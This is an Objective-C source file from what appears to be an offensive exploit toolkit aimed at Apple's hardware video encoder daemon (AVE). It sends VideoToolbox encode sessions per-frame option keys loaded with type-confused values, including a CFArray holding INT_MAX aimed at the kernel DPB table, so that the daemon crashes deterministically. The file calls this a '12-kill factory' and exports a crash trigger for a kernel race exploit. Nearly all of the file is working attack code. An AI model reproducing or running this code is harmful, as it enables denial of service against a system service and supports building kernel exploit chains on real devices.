//  probe_ave_tkill.m - DirtySlide ROW A: AVE T-KILL (v142 - the 26.6 kill factory)
//  The 26.6 (23G71) RE re-pinned the census in H264H9.videoencoder WITH symbols:
//  AVE_GetPerFrameData @0x2a05881d0 has TEN unconditional CFNumberGetValue(SInt32)
//  sites (SliceQP, PicParameterSetId, VRAUsedDimension, POCLsb, CalculateYUVChecksum,
//  MarkCurrentFrameAsLTR, RVRADimension, UserFrameType, FrameNumForLTRToReplace,
//  SliceAlphaC0OffsetDiv2/BetaOffsetDiv2), UserQpMap has NO type check
//  (CFDataGetLength on a foreign type), SetDPB flows into AVE_DPB_RetrieveSnapshot
//  doing a bare CFArrayGetCount @0x2a05a1f54, and ReferenceL0 elements still reach
//  AVE_CFDict_GetSInt32 -> CFDictionaryContainsKey (the 7/7 .ips chain of 08-24).
//  Every cell rides the proven per-frame channel (kVTEncodeFrameOptionKey_SliceQP
//  long-name array = the gate opener) + ONE hostile container key. The .ips is the
//  receipt. MAY CRASH DAEMON.
#include "ds_core.h"

static const char *ds_tk_xkeys[20] = {
    "PicParameterSetId", "ReferenceL0", "UserQpMap", "VRAUsedDimension",
    "AttachDPB", "FinalFrame", "UserFrameType", "ForceKeyFrame",
    "ForceRefresh", "RepeatedFrame", "MarkCurrentFrameAsLTR", "RVRADimension",
    "FrameNumForLTRToReplace", "SetDPB", "FirstMbInRecvSlices",
    "SliceAlphaC0OffsetDiv2", "SliceBetaOffsetDiv2",
    "SliceQP", "POCLsb", "CalculateYUVChecksum"   /* v142: the 26.6 symbol-pinned keys */
};

static void ds_tk_cell(const char *pfx, const char *tag, int keyIdx, int ctype, int expectKill,
                       int nF, int hostFrame)
{
    if (g_opt_conn_poisoned) {
        dprintf(STDOUT_FILENO, "%s  I[%s] TK-SKIPPED (conn poisoned)\n", pfx, tag);
        return;
    }
    char st0[32];
    if (ds_epoch_exhausted(pfx)) return;
    ds_epoch_bump(pfx, tag);
    ds_ave_stamp(st0, sizeof(st0));
    const char *ct = (ctype == 0) ? "CFArray-of-CFNum" : (ctype == 1) ? "CFString"
                   : (ctype == 2) ? "CFArray-of-CFString" : "CFArray{1,INTMAX}";
    dprintf(STDOUT_FILENO, "%s [%s] I[%s] T-KILL key=%s ctype=%s frames=%d hostFrame=%d expectKill=%d\n",
            pfx, st0, tag, ds_tk_xkeys[keyIdx], ct, nF, hostFrame, expectKill);
    char stag[40];
    snprintf(stag, sizeof(stag), "TK %s", ds_tk_xkeys[keyIdx]);
    ds_journal_write("START", stag);
    int sig = 0, es = -999;
    __block VTCompressionSessionRef csOut = NULL;
    unsigned long f0 = (unsigned long)g_ave_cb_fires, o0 = (unsigned long)g_ave_cb_ok;
    unsigned long b0 = (unsigned long)g_ave_cb_bytes;
    g_ave_cb_err = 0; g_ave_cb_hash = 0;
    uint64_t t0 = mach_absolute_time();
    sig = ds_ave_guard_run_tmo(^int {
        VTCompressionSessionRef cs = NULL;
        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        if (sp) CFDictionarySetValue(sp, kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder, kCFBooleanTrue);
        OSStatus csSt = VTCompressionSessionCreate(NULL, 1920, 1080, kCMVideoCodecType_H264,
                                                   sp, NULL, NULL, ave_out_cb, NULL, &cs);
        if (sp) CFRelease(sp);
        if (csSt != 0 || !cs) return (int)csSt;
        VTSessionSetProperty(cs, CFSTR("EnableUserQPMap"), kCFBooleanTrue);
        /* pf2 2vuy-IOSURF frame (the v81-proven clean carrier) */
        CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFMutableDictionaryRef iosProps = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CVPixelBufferRef pb = NULL;
        CVReturn cr = -1;
        if (attrs && iosProps) {
            CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosProps);
            cr = CVPixelBufferCreate(NULL, 1920, 1080, kCVPixelFormatType_422YpCbCr8, attrs, &pb);
        }
        if (attrs) CFRelease(attrs);
        if (iosProps) CFRelease(iosProps);
        if (cr != 0 || !pb) { VTCompressionSessionInvalidate(cs); CFRelease(cs); return (int)cr; }
        if (CVPixelBufferLockBaseAddress(pb, 0) == 0) {
            memset(CVPixelBufferGetBaseAddress(pb), 0x41, (size_t)CVPixelBufferGetBytesPerRow(pb) * 1080);
            CVPixelBufferUnlockBaseAddress(pb, 0);
        }
        OSStatus b = VTCompressionSessionPrepareToEncodeFrames(cs);
        /* the v116-proven gate opener rides EVERY frame; the HOSTILE key only on
         * hostFrame (nF=1/hostFrame=0 = the classic single-shot). hostFrame>=1 =
         * the prime-gated keys (SetDPB: 'need >=1 picture to prime AVE'). */
        for (int f = 0; b == 0 && f < nF; f++) {
            CFMutableDictionaryRef fp = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            if (!fp) { b = -9999; break; }
            long sq26 = 26;
            CFNumberRef sqn = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &sq26);
            CFMutableArrayRef sqa = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
            if (sqa && sqn) CFArrayAppendValue(sqa, sqn);
            if (sqn) CFRelease(sqn);
            if (sqa) { CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_SliceQP"), sqa); CFRelease(sqa); }
            if (f == hostFrame && keyIdx >= 0) {
                CFStringRef kx = CFStringCreateWithCString(kCFAllocatorDefault, ds_tk_xkeys[keyIdx], kCFStringEncodingUTF8);
                if (kx) {
                    if (ctype == 1) {
                        CFStringRef sx = CFStringCreateWithCString(kCFAllocatorDefault, "T-KILL-confusion", kCFStringEncodingUTF8);
                        if (sx) { CFDictionarySetValue(fp, kx, sx); CFRelease(sx); }
                    } else if (ctype == 2) {
                        CFMutableArrayRef ax = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
                        if (ax) {
                            for (int i = 0; i < 4; i++) {
                                CFStringRef sx = CFStringCreateWithCString(kCFAllocatorDefault, "T-KILL-confusion", kCFStringEncodingUTF8);
                                if (sx) { CFArrayAppendValue(ax, sx); CFRelease(sx); }
                            }
                            CFDictionarySetValue(fp, kx, ax);
                            CFRelease(ax);
                        }
                    } else if (ctype == 3) {
                        /* v143: HOSTILE VALUES - CFArray{1, INTMAX} = the kernel DPB
                         * table-value shot (updateDPB=true on a primed DPB) */
                        CFMutableArrayRef ax = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
                        if (ax) {
                            long v1 = 1, v2 = 0x7FFFFFFF;
                            CFNumberRef n1 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v1);
                            CFNumberRef n2 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v2);
                            if (n1) { CFArrayAppendValue(ax, n1); CFRelease(n1); }
                            if (n2) { CFArrayAppendValue(ax, n2); CFRelease(n2); }
                            CFDictionarySetValue(fp, kx, ax);
                            CFRelease(ax);
                        }
                    } else {
                        CFMutableArrayRef ax = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
                        long h26 = 26;
                        CFNumberRef hn = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &h26);
                        if (ax && hn) CFArrayAppendValue(ax, hn);
                        if (hn) CFRelease(hn);
                        if (ax) { CFDictionarySetValue(fp, kx, ax); CFRelease(ax); }
                    }
                    CFRelease(kx);
                }
            }
            b = VTCompressionSessionEncodeFrame(cs, pb, CMTimeMake(f, 600), CMTimeMake(1, 600), fp, NULL, NULL);
            CFRelease(fp);
        }
        if (b == 0) b = VTCompressionSessionCompleteFrames(cs, kCMTimeInvalid);
        CVBufferRelease(pb);
        csOut = cs;
        return (int)b;
    }, &es, 10000);
    double tMs = ds_ave_elapsed_ms(t0);
    if (sig == SIGALRM) {
        g_opt_conn_poisoned = 1;
        ds_journal_write("DONE", stag);
        dprintf(STDOUT_FILENO, "%s  I[%s] %s TIMEOUT (10s) = CONN DEAD\n", pfx, tag, ds_tk_xkeys[keyIdx]);
    } else if (sig > 0) {
        ds_journal_write("DONE", stag);
        dprintf(STDOUT_FILENO, "%s  I[%s] %s sig=%d CLIENT-FAULT @0x%lx\n", pfx, tag, ds_tk_xkeys[keyIdx], sig, (unsigned long)g_ave_fault_addr);
    }
    if (csOut) ds_opt_teardown(pfx, tag, csOut);
    if (sig == 0) {
        unsigned long df = (unsigned long)g_ave_cb_fires - f0;
        unsigned long dO = (unsigned long)g_ave_cb_ok - o0;
        unsigned long dB = (unsigned long)g_ave_cb_bytes - b0;
        const char *vd;
        if (es != 0 && df == 0) vd = "REJECT";
        else if (dO > 0) vd = "ACCEPT";
        else if (df > 0) vd = "DROP";
        else vd = "NO-CB";
        if (strcmp(vd, "ACCEPT") != 0 && (es == -12912 || es == -12914)) vd = "KILLED";
        else if (expectKill && strcmp(vd, "ACCEPT") != 0) vd = "KILLED";
        snprintf(stag, sizeof(stag), "TK %s %s", ds_tk_xkeys[keyIdx], vd);
        ds_journal_write("DONE", stag);
        dprintf(STDOUT_FILENO, "%s  I[%s] %s es=%d cb+%lu ok+%lu B+%lu err=%d t=%.0fms VERDICT=%s\n",
                pfx, tag, ds_tk_xkeys[keyIdx], es, df, dO, dB, (int)g_ave_cb_err, tMs, vd);
        if (strcmp(vd, "KILLED") == 0) {
            dprintf(STDOUT_FILENO, "%s  I[%s] %s: DAEMON DIED (es=%d) - .ips is the receipt; 12s respawn wait\n",
                    pfx, tag, ds_tk_xkeys[keyIdx], es);
            usleep(12000000);
        }
        if (strcmp(vd, "NO-CB") == 0) { g_opt_conn_poisoned = 1; dprintf(STDOUT_FILENO, "%s  I[%s] NO-CB = CONN SUSPECT - row stops\n", pfx, tag); }
    }
    usleep(80000);
}

/* v137: exported for the TK x 43805 compound - fire the X5 (ReferenceL0
 * CFArray-of-CFString) deterministic daemon kill from ANOTHER row (the IOK
 * row uses it as the FORCED kext-detach trigger mid-race). */
void ds_tk_kill(const char *pfx, const char *tag)
{
    ds_tk_cell(pfx, tag, 1, 2, 1, 1, 0);   /* keyIdx=1 ReferenceL0, ctype=2 CFArray-of-CFString, expectKill=1 */
}

void probe_ave_tkill(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s== A. AVE T-KILL (v146 - the final factory: 12 kills) ==\n", pfx);
        dprintf(STDOUT_FILENO, "%s  CFString abort shot + CFArray{1,INTMAX} kernel-DPB-value shot). .ips = receipt.\n", pfx);
    static const struct { int key; int ct; int kill; int nF; int hf; } rows[] = {
        { -1, 0, 0, 1, 0 },  /* TK00 control */
        { 18, 1, 1, 1, 0 },  /* POCLsb = CFString (proven 21:04 kill) */
        { 19, 1, 1, 1, 0 },  /* CalculateYUVChecksum = CFString (proven) */
        { 0,  0, 1, 1, 0 },  /* PicParameterSetId = CFArray */
        { 3,  0, 1, 1, 0 },  /* VRAUsedDimension = CFArray */
        { 2,  0, 1, 1, 0 },  /* UserQpMap = CFArray (NO type check) */
        { 6,  0, 1, 1, 0 },  /* UserFrameType = CFArray */
        { 11, 0, 1, 1, 0 },  /* RVRADimension = CFArray */
        { 12, 0, 1, 1, 0 },  /* FrameNumForLTRToReplace = CFArray */
        { 15, 0, 1, 1, 0 },  /* SliceAlphaC0OffsetDiv2 = CFArray */
        { 16, 0, 1, 1, 0 },  /* SliceBetaOffsetDiv2 = CFArray */
        { 17, 1, 1, 1, 0 },  /* SliceQP bare scalar = CFString */
        /* SetDPB CUT v146: prime-fixed shots ACCEPTED twice (23:45) = the DPB
         * snapshot parse never runs on our session shape - INERT, demoted. */
        { 1,  2, 1, 1, 0 },  /* ReferenceL0 = CFArray-of-CFString - the X5 witness LAST */
    };
    for (size_t ri = 0; ri < sizeof(rows) / sizeof(rows[0]); ri++) {
        char ttag[28];
        if (rows[ri].key < 0) snprintf(ttag, sizeof(ttag), "TK00 control");
        else snprintf(ttag, sizeof(ttag), "TK%02zu %s", ri, ds_tk_xkeys[rows[ri].key]);
        if (rows[ri].key < 0) {
            dprintf(STDOUT_FILENO, "%s  I[TK00 control] plain 1920x1080 encode (must ACCEPT)\n", pfx);
            ds_epoch_bump(pfx, "TK00 control");
            ds_ave_replay(pfx, "TK00 control", 1920, 1080, 1920, kCMVideoCodecType_H264, kCVPixelFormatType_422YpCbCr8, 1, 1);
            continue;
        }
        ds_tk_cell(pfx, ttag, rows[ri].key, rows[ri].ct, rows[ri].kill, rows[ri].nF, rows[ri].hf);
    }
    for (int tkh = 1; tkh <= 2; tkh++) {
        char htag[16];
        snprintf(htag, sizeof(htag), "TKH%02d beat", tkh);
        ds_ave_replay(pfx, htag, 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
        usleep(500000);
    }
    dprintf(STDOUT_FILENO, "%s  A read-offs: 12/12 KILLED = the factory holds. CUT total: MarkCurrentFrameAsLTR\n", pfx);
    dprintf(STDOUT_FILENO, "%s  (survived 3x) + SetDPB x2 (prime-fixed shots ACCEPTED = the DPB-snapshot parse\n", pfx);
    dprintf(STDOUT_FILENO, "%s  never runs on our session shape - INERT). The factory is FINAL: 12 kills.\n", pfx);
}
